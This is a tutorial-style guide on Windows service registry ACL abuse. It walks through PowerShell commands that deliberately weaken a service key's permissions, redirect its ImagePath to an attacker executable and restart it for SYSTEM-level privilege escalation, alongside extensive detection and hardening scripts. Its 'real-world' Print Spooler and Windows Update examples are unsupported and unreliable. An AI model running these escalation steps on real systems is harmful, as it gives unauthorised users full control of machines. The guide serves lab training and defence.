# Windows Registry Permission Abuse - Privilege Escalation Guide

> **⚠️ Disclaimer:** This guide is for educational purposes only. Unauthorized access to computer systems is illegal. Only perform testing on authorized systems with explicit permission.

## 📚 Table of Contents

- [Concept](#concept)
- [Attack Scenario](#attack-scenario)
- [Implementation Guide](#implementation-guide)
- [How It Works](#how-it-works)
- [Real-World Examples](#real-world-examples)
- [Detection & Mitigation](#detection--mitigation)
- [Key Takeaways](#key-takeaways)

---

## Concept

### What is Windows Registry?

The Windows Registry is a centralized database that stores configuration settings and options for the Windows operating system and installed applications.

```
HKEY_LOCAL_MACHINE (HKLM)
├── SYSTEM
│   └── CurrentControlSet
│       └── Services ← Service configurations
│           ├── VulnService
│           │   ├── ImagePath: C:\Program Files\Vulnapp\service.exe
│           │   ├── DisplayName: Service Display Name
│           │   └── Start: 2 (Automatic)
│           └── [Other Services]
├── SOFTWARE
└── SAM

HKEY_CURRENT_USER (HKCU)
└── User-specific settings
```

### Registry Permissions

Every registry key is protected by an ACL (Access Control List) that defines which users or groups can perform specific actions.

| Permission | Description |
|-----------|-------------|
| **QueryValues** | Read the values of the registry key |
| **SetValue** | Modify the values of the registry key |
| **CreateSubKey** | Create new subkeys under this key |
| **EnumerateSubKeys** | List all subkeys |
| **Delete** | Delete the registry key |
| **WriteKey** | Modify the key (equivalent to SetValue) |
| **ReadKey** | Read the key and its values |
| **FullControl** | All permissions - complete control 🚨 |

---

## Attack Scenario

### Real-World Example

```
SITUATION:
A company has a backup service that runs with SYSTEM privileges:
- Location: C:\Program Files\BackupApp\backup.exe
- Runs every night to perform backups
- Registry key: HKLM\SYSTEM\CurrentControlSet\Services\BackupApp

PROBLEM:
The registry key has weak permissions - regular users have FullControl access! 🚨

ATTACK CHAIN:
1. Attacker logs in with a limited user account
2. Attacker accesses the vulnerable registry key
3. Attacker modifies the ImagePath to point to their malicious executable
4. Service is restarted (either manually or during system reboot)
5. Malicious file is executed with SYSTEM privileges
6. Complete privilege escalation achieved! 💥
```

---

## Implementation Guide

### Step 1: Create Vulnerable Service (Admin Privileges Required)

```powershell
# Create a new service
New-Service -Name "VulnService" `
  -BinaryPathName "C:\Program Files\Vulnapp\service.exe" `
  -StartupType Automatic `
  -DisplayName "Vulnerable Service"

# Expected Output:
# Status  Name         DisplayName
# ------  ----         -----------
# Stopped VulnService  Vulnerable Service
```

**Explanation:**
- This creates a service that will run at startup
- The service will execute with SYSTEM privileges
- The binary path points to the legitimate executable

---

### Step 2: Check Current Registry Permissions

```powershell
# View the current ACL for the service registry key
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" | Format-List

# Output:
# Owner   : BUILTIN\Administrators
# Group   : NT AUTHORITY\SYSTEM
# Access  : BUILTIN\Administrators Allow FullControl
#           NT AUTHORITY\SYSTEM Allow FullControl
#           BUILTIN\Users Allow ReadKey  ← Only read access
```

**Analysis:**
- Currently: Users can only read the registry key
- This is SECURE - users cannot modify it
- Administrators and SYSTEM have FullControl

---

### Step 3: Introduce Vulnerability - Set Weak Permissions

```powershell
# Define the registry path
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService"

# Get the current ACL object
$acl = Get-Acl $regPath

# Create a new access rule: Grant BUILTIN\Users FullControl
$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
  "BUILTIN\Users",           # Identity
  "FullControl",             # Rights
  "Allow"                    # Access Control Type
)

# Add the rule to the ACL
$acl.SetAccessRule($rule)

# Apply the modified ACL to the registry key
Set-Acl -Path $regPath -AclObject $acl

# Verify the changes
Get-Acl $regPath | Format-List
```

**Expected Output After Modification:**
```
Access  : BUILTIN\Users Allow FullControl ← VULNERABILITY! 🚨
          NT AUTHORITY\SYSTEM Allow FullControl
          BUILTIN\Administrators Allow FullControl
```

---

### Step 4: Verify Weak Permissions Are Set

```powershell
# Retrieve the ACL for the service
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService"

# Check if Users group has FullControl
$acl.Access | Where-Object {$_.IdentityReference -match "Users"}

# Output will show:
# IdentityReference        : BUILTIN\Users
# AccessControlType        : Allow
# RegistryRights           : FullControl ← Vulnerability confirmed!
# IsInherited              : False
# InheritanceFlags         : None
# PropagationFlags         : None
```

---

### Step 5: Exploit the Vulnerability

```powershell
# From the perspective of an attacker with limited user privileges:

# 1. First, check the current ImagePath value
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" | 
  Select-Object ImagePath

# Output:
# ImagePath: C:\Program Files\Vulnapp\service.exe

# 2. Replace it with a malicious executable path
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" `
  -Name "ImagePath" `
  -Value "C:\Program.exe"

# 3. Verify that the change was successful
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" | 
  Select-Object ImagePath

# Output:
# ImagePath: C:\Program.exe ← Attacker's malicious file!
```

**What Happened:**
1. The user had FullControl permission on the registry key
2. This allowed the user to modify the ImagePath value
3. Now the service will execute the attacker's file instead of the legitimate one

---

### Step 6: Trigger the Exploit

```powershell
# Method 1: Restart the service immediately
Restart-Service -Name "VulnService" -Force

# OR Method 2: Stop and start separately
Stop-Service -Name "VulnService" -Force
Start-Service -Name "VulnService"
```

**What Happens During Restart:**
```
1. Service stops
2. Service starts again
3. Windows reads the ImagePath from the registry
4. Windows finds: C:\Program.exe
5. Windows executes the attacker's file
6. Malicious code runs with SYSTEM privileges
7. COMPLETE PRIVILEGE ESCALATION! 💥
```

**Result:** An unprivileged user now has SYSTEM-level access.

---

## How It Works

### Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────────┐
│ STEP 1: SERVICE CREATION                                    │
│ Administrator creates a service with SYSTEM privileges      │
│ ImagePath: C:\Program Files\Vulnapp\service.exe            │
│ Start Type: Automatic                                       │
└──────────────────────┬──────────────────────────────────────┘
                       ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 2: INITIAL PERMISSIONS                                │
│ Only Admins and SYSTEM have FullControl                    │
│ BUILTIN\Users have only ReadKey (restricted)               │
└──────────────────────┬──────────────────────────────────────┘
                       ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 3: VULNERABILITY CREATION                             │
│ Admin accidentally grants BUILTIN\Users FullControl ⚠️      │
│ Now users can modify ANY registry entry!                   │
└──────────────────────┬──────────────────────────────────────┘
                       ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 4: ATTACKER DISCOVERY                                 │
│ Attacker logs in with limited user account                 │
│ Discovers the weak permissions                             │
│ Realizes they can modify the registry                      │
└──────────────────────┬──────────────────────────────────────┘
                       ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 5: EXPLOITATION                                       │
│ Attacker changes ImagePath to malicious executable         │
│ ImagePath: C:\Program.exe (attacker's malware)            │
└──────────────────────┬──────────────────────────────────────┘
                       ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 6: TRIGGER                                             │
│ Service is restarted (reboot or manual)                    │
│ Windows reads ImagePath from registry                      │
│ Executes the attacker's malicious executable               │
└──────────────────────┬──────────────────────────────────────┘
                       ↓
┌─────────────────────────────────────────────────────────────┐
│ STEP 7: PRIVILEGE ESCALATION SUCCESS! 🎉                   │
│ Attacker's code now runs with SYSTEM privileges            │
│ Complete system compromise achieved                        │
└─────────────────────────────────────────────────────────────┘
```

### Technical Breakdown

**Why This Works:**

1. **Service Execution Context:** Windows services run with specific privileges (often SYSTEM)
2. **Registry Read at Runtime:** Each time a service starts, it reads configuration from the registry
3. **Weak ACLs:** If regular users can modify the registry entry, they can change the executable path
4. **Privilege Escalation:** When the service restarts, the attacker's code inherits the service's privileges

---

## Real-World Examples

### Example 1: PrintSpooler Service Vulnerability

```
SERVICE: Print Spooler (spoolsv.exe)
───────────────────────────────────

VULNERABILITY:
The Print Spooler service registry key had weak permissions
Regular users could modify the service configuration

IMPACT:
- Users could change the service's executable path
- Spooler service runs with high privileges
- Users could inject their own code

EXPLOITATION:
Attacker modifies: HKLM\SYSTEM\CurrentControlSet\Services\Spooler
Changes ImagePath to point to malicious executable
Spooler service is restarted
Malicious code executes with high privileges

RESULT: Privilege escalation + Lateral movement possible
```

### Example 2: Windows Update Service

```
SERVICE: Windows Update (wuauserv)
──────────────────────────────────

VULNERABILITY:
Registry permissions on the Update service were misconfigured
Allowed users to modify service settings

IMPACT:
- Update service runs on every boot with SYSTEM privileges
- Users could replace the executable
- Perfect for establishing persistence

EXPLOITATION:
Attacker modifies the ImagePath value
Injects malicious code to run at every boot
Even if the admin tries to update Windows, attacker's code still runs

RESULT: Persistent backdoor + Complete system compromise
```

### Example 3: Backup Service (Real-World Scenario)

```
SITUATION: A company's backup service had weak registry permissions

DISCOVERY: A disgruntled employee realized users had FullControl

EXPLOITATION:
1. Employee replaced the backup executable with malware
2. Service ran the malware with SYSTEM privileges
3. Malware silently exfiltrated data from the entire organization
4. Installed a backdoor for future access

IMPACT: Massive data breach + ongoing unauthorized access
```

---

## Detection & Mitigation

### A. Detection Methods

#### Method 1: Scan for Weak Registry Permissions

```powershell
# Scan all services for weak permissions
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"

foreach ($service in $services) {
    $acl = Get-Acl $service.PSPath
    
    # Look for FullControl permissions granted to Users or Everyone
    $usersFullControl = $acl.Access | 
        Where-Object {
            $_.IdentityReference -match "Users|Everyone" -and 
            $_.RegistryRights -eq "FullControl"
        }
    
    if ($usersFullControl) {
        Write-Host "VULNERABLE: $($service.PSChildName)" -ForegroundColor Red
        Write-Host "IdentityReference: $($usersFullControl.IdentityReference)" -ForegroundColor Yellow
        Write-Host "Rights: $($usersFullControl.RegistryRights)" -ForegroundColor Yellow
    }
}
```

#### Method 2: Monitor Registry Modifications

```powershell
# Enable registry auditing
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Query for recent registry modifications
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4657  # Registry value modified event
    StartTime = (Get-Date).AddHours(-24)
} | 
Where-Object {$_.Message -match "ImagePath|ServiceDll"} | 
Select-Object TimeCreated, Message
```

**Event ID 4657** fires whenever a registry value is changed.

#### Method 3: Complete Service Permission Audit

```powershell
# Comprehensive audit of all service permissions
$auditResults = @()

Get-Service | ForEach-Object {
    $serviceName = $_.Name
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
    
    try {
        $acl = Get-Acl $regPath -ErrorAction Stop
        
        # Check each permission entry
        $acl.Access | ForEach-Object {
            if ($_.IdentityReference -match "Users|Everyone|Authenticated Users") {
                $auditResults += [PSCustomObject]@{
                    Service = $serviceName
                    Identity = $_.IdentityReference
                    RegistryRights = $_.RegistryRights
                    AccessType = $_.AccessControlType
                    IsInherited = $_.IsInherited
                    Severity = if ($_.RegistryRights -eq "FullControl") {"CRITICAL"} else {"WARNING"}
                }
            }
        }
    }
    catch {
        # Skip services where we can't access permissions
    }
}

# Display results sorted by severity
$auditResults | Sort-Object Severity -Descending | Format-Table -AutoSize
```

#### Method 4: Real-Time Monitoring Script

```powershell
# Monitor registry for suspicious changes
$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services"

# Get baseline of all services
$baseline = @{}
Get-ChildItem $registryPath | ForEach-Object {
    $baseline[$_.PSChildName] = (Get-ItemProperty $_.PSPath).ImagePath
}

# Check every 30 seconds for changes
while ($true) {
    Get-ChildItem $registryPath | ForEach-Object {
        $serviceName = $_.PSChildName
        $currentPath = (Get-ItemProperty $_.PSPath).ImagePath
        
        if ($baseline[$serviceName] -ne $currentPath) {
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Write-Warning "[$timestamp] SERVICE MODIFIED: $serviceName"
            Write-Warning "Old Path: $($baseline[$serviceName])"
            Write-Warning "New Path: $currentPath"
            
            # Update baseline
            $baseline[$serviceName] = $currentPath
        }
    }
    
    Start-Sleep -Seconds 30
}
```

---

### B. Mitigation Strategies

#### 1. Restrict Registry Permissions (Remove Weak Permissions)

```powershell
# This script removes dangerous permissions from all service registry keys

$servicesPath = "HKLM:\SYSTEM\CurrentControlSet\Services"
$dangerousRights = @("FullControl", "WriteKey")

foreach ($service in Get-ChildItem $servicesPath) {
    try {
        $acl = Get-Acl $service.PSPath
        $modified = $false
        
        # Find and remove weak permissions
        $weakRules = $acl.Access | 
            Where-Object {
                $_.IdentityReference -match "Everyone|Users|Authenticated Users" -and
                $_.RegistryRights -in $dangerousRights -and
                $_.AccessControlType -eq "Allow"
            }
        
        foreach ($rule in $weakRules) {
            Write-Host "Removing weak permission from: $($service.PSChildName)" -ForegroundColor Yellow
            Write-Host "  Identity: $($rule.IdentityReference)"
            Write-Host "  Rights: $($rule.RegistryRights)"
            
            $acl.RemoveAccessRule($rule)
            $modified = $true
        }
        
        if ($modified) {
            Set-Acl -Path $service.PSPath -AclObject $acl
            Write-Host "Permissions updated for: $($service.PSChildName)" -ForegroundColor Green
        }
    }
    catch {
        Write-Warning "Failed to update permissions for $($service.PSChildName): $_"
    }
}
```

#### 2. Implement Principle of Least Privilege

Always run services with the minimum required privileges:

```powershell
# Instead of using SYSTEM, consider these alternatives:

# Option 1: Local Service (minimal network access)
New-Service -Name "MyService" `
  -BinaryPathName "C:\Path\To\Service.exe" `
  -ServiceAccount LocalService

# Option 2: Network Service (for services needing network access)
New-Service -Name "MyService" `
  -BinaryPathName "C:\Path\To\Service.exe" `
  -ServiceAccount NetworkService

# Option 3: Custom Service Account (most secure)
$password = Read-Host -AsSecureString "Enter password for service account"
New-Service -Name "MyService" `
  -BinaryPathName "C:\Path\To\Service.exe" `
  -Credential (New-Object System.Management.Automation.PSCredential("domain\serviceaccount", $password))

# AVOID when possible:
# - SYSTEM (only if absolutely necessary)
# - Administrator (never for service accounts)
# - High-privilege domain accounts
```

#### 3. Enable Registry Change Auditing

```powershell
# Enable comprehensive registry auditing

# Enable audit policy
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Verify auditing is enabled
auditpol /get /subcategory:"Registry"

# Export audit logs for analysis
wevtutil epl Security C:\Logs\SecurityAudit.evtx
```

#### 4. Regular Permission Audits (Automated)

```powershell
# Weekly automated audit script
# Schedule this with Windows Task Scheduler

$reportPath = "C:\SecurityReports\RegistryPermissionsAudit_$(Get-Date -f 'yyyyMMdd_HHmmss').csv"
$report = @()

Get-Service | ForEach-Object {
    $serviceName = $_.Name
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
    
    try {
        $acl = Get-Acl $regPath -ErrorAction Stop
        
        $acl.Access | ForEach-Object {
            if ($_.IdentityReference -match "Everyone|Users|Authenticated Users") {
                $report += [PSCustomObject]@{
                    Service = $serviceName
                    Identity = $_.IdentityReference
                    RegistryRights = $_.RegistryRights
                    AccessType = $_.AccessControlType
                    Inherited = $_.IsInherited
                    AuditDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            }
        }
    }
    catch {
        # Skip if unable to read
    }
}

# Export to CSV
$report | Export-Csv -Path $reportPath -NoTypeInformation

# Send alert if vulnerabilities found
if ($report.Count -gt 0) {
    Write-Warning "Vulnerabilities found! Report saved to: $reportPath"
    # Optional: Send email notification
    # Send-MailMessage -To "admin@company.com" -Subject "Registry Vulnerabilities Found" ...
}
```

#### 5. Implement File Integrity Monitoring

```powershell
# Monitor service executable files for unauthorized changes

$servicePath = "C:\Program Files\CriticalService"
$hashFile = "C:\Hashes\ServiceExecutableHashes.txt"

# Generate baseline (run once)
Get-ChildItem $servicePath -File | ForEach-Object {
    $hash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
    "$($_.Name)|$hash" | Out-File $hashFile -Append
}

# Continuous monitoring (run periodically)
Get-ChildItem $servicePath -File | ForEach-Object {
    $currentHash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
    $storedHash = (Select-String -Path $hashFile -Pattern "^$($_.Name)\|").Line.Split("|")[1]
    
    if ($currentHash -ne $storedHash) {
        Write-Warning "Service executable modified: $($_.Name)"
        Write-Warning "Expected hash: $storedHash"
        Write-Warning "Current hash: $currentHash"
        # Alert administrator
    }
}
```

---

## Key Takeaways

### 1. **Core Vulnerability**
Weak registry permissions on service entries allow unprivileged users to modify how services execute, leading to privilege escalation.

### 2. **Attack Chain Summary**
```
Weak Registry Permissions
        ↓
User Can Modify Service Registry Entry
        ↓
User Changes ImagePath to Malicious Executable
        ↓
Service Restarts
        ↓
Service Executes Malicious Code with System Privileges
        ↓
Complete Privilege Escalation Achieved
```

### 3. **Potential Impact**
- 🚨 Complete system compromise
- 🚨 Persistent backdoor installation
- 🚨 Lateral movement to other systems
- 🚨 Data exfiltration
- 🚨 Malware distribution
- 🚨 Ransomware deployment

### 4. **Detection Indicators**
- ✅ Users or Everyone group with FullControl on service registry keys
- ✅ Unexpected changes to service ImagePath values
- ✅ Registry modification events (Event ID 4657)
- ✅ Service executable file integrity changes
- ✅ Unusual service execution paths

### 5. **Prevention Best Practices**
- ✅ Restrict registry permissions to Administrators only
- ✅ Run services with minimal required privileges
- ✅ Monitor registry changes in real-time
- ✅ Implement file integrity monitoring
- ✅ Regular security audits
- ✅ Keep Windows and software up-to-date
- ✅ Use AppLocker to prevent unauthorized executables
- ✅ Enable and review audit logs

---

## Quick Reference - Commands

### Create Vulnerable Service
```powershell
New-Service -Name "VulnService" `
  -BinaryPathName "C:\Program Files\Vulnapp\service.exe" `
  -StartupType Automatic
```

### Check Permissions
```powershell
Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" | Format-List
```

### Set Weak Permissions (Vulnerability)
```powershell
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
  "BUILTIN\Users","FullControl","Allow"
)
$acl.SetAccessRule($rule)
Set-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" -AclObject $acl
```

### Exploit (Modify Service Executable)
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" `
  -Name "ImagePath" `
  -Value "C:\Program.exe"
```

### Trigger Exploitation
```powershell
Restart-Service -Name "VulnService" -Force
```

### Scan for Vulnerabilities
```powershell
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
foreach ($service in $services) {
    $acl = Get-Acl $service.PSPath
    $usersFullControl = $acl.Access | 
        Where-Object {$_.IdentityReference -match "Users" -and $_.RegistryRights -eq "FullControl"}
    if ($usersFullControl) {
        Write-Host "VULNERABLE: $($service.PSChildName)" -ForegroundColor Red
    }
}
```

### Remove Weak Permissions
```powershell
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService"
$weakRules = $acl.Access | Where-Object {$_.IdentityReference -match "Users" -and $_.RegistryRights -eq "FullControl"}
foreach ($rule in $weakRules) {
    $acl.RemoveAccessRule($rule)
}
Set-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" -AclObject $acl
```

---

## Testing Safely

### Lab Environment Setup

1. **Create Isolated Virtual Machine**
   - Windows 10/11 or Windows Server
   - Isolated network (no internet connectivity)
   - No sensitive data

2. **Create Test Executable**
   ```powershell
   # Create a simple test executable instead of malware
   @"
   @echo off
   echo Test execution successful
   pause
   "@ | Out-File "C:\test.bat"
   ```

3. **Run Tests Only on Test VMs**
   - Never on production systems
   - Always get explicit authorization
   - Document all tests performed

---

## Resources

- [Microsoft Windows Registry Documentation](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry)
- [PowerShell Get-Acl Documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl)
- [Windows Service Security Best Practices](https://docs.microsoft.com/en-us/windows/win32/services/services)
- [Event ID 4657 - Registry Value Modification](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4657)
- [MITRE ATT&CK - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)

---

## Contributing

Contributions are welcome! If you have:
- Additional detection methods
- Mitigation strategies
- Real-world examples
- Bug fixes

Please submit a pull request or open an issue.

---

## License

This project is licensed under the MIT License - see LICENSE file for details.

---

## Disclaimer

**Educational Use Only**

This guide is provided for educational and authorized security testing purposes only. The author is not responsible for any misuse or illegal activities. Unauthorized access to computer systems is illegal and punishable by law. Always obtain explicit written permission before testing any system.

---

**Last Updated:** 2024
**Version:** 2.0
